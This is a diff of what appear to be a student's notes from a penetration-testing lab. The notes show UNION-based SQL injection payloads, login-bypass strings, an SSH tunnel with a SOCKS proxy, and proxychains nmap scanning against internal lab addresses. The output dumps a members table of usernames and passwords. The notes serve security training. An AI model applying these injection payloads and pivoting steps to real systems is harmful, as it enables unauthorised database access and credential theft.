@@ -52,7 +52,7 @@ mysql
            127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT 1,2,3,4
 
 #GOLDEN STATEMENT
-          UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information-schema.columns;
+          UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information_schema.columns;
           127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information_schema.columns;  
 #CRAFT QUERY
           127.0.0.1:8888/uniondemo.php?selection=2 UNION SELECT id,name,pass FROM session.user;
@@ -68,7 +68,7 @@ mysql
 ##POST METHOD
           ' OR 1='1
           ' UNION SELECT 1,2,3,4
-          ' UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information-schema.columns;
+          ' UNION SELECT table_schema,Table_name,column_name (,placeholders if needed) From information_schema.columns;
           ' UNION SELECT id,name,pass FROM session.user
 ###VERSION
           http://127.0.0.1:8888/uniondemo.php?Selection=2 UNION SELECT 1,2,@@version
@@ -105,9 +105,22 @@ proxychains nmap --script=http-enum 10.100.28.48
                     4444/tcp open  krb524
 
 
+sudo ssh -MS /tmp/jump student@10.50.15.162 -L 23300:10.100.28.48:4444 -L 23301:10.100.28.48:80 -D 9050
+        firefox http://127.0.0.1:23301  
+                    brought me to Donovia National Logistics Agency Website
 
-
-
+http://127.0.0.1:23301/cases/productsCategory.php?category=13%20UNION%20SELECT%20table_schema,Table_name,column_name%20From%20information_schema.columns
+http://127.0.0.1:23301/cases/productsCategory.php?category=13%20UNION%20SELECT%20id,username,password%20from%20sqlinjection.members
+                    1	Boss	0tj6MAeQtNWmN6gGhRmB
+                    2	Maverick	turn&burn
+                    3	phreak	pwd
+                    4	Susan	flowers99
+                    5	TW	imAPlaya
+                    6	1-2-3-4	sayULuvM3
+                    7	rich_kid	1M$
+                    8	p0pStar	thrilla
+                    9	Joe	vato
+                    10		flag:
 
 
 
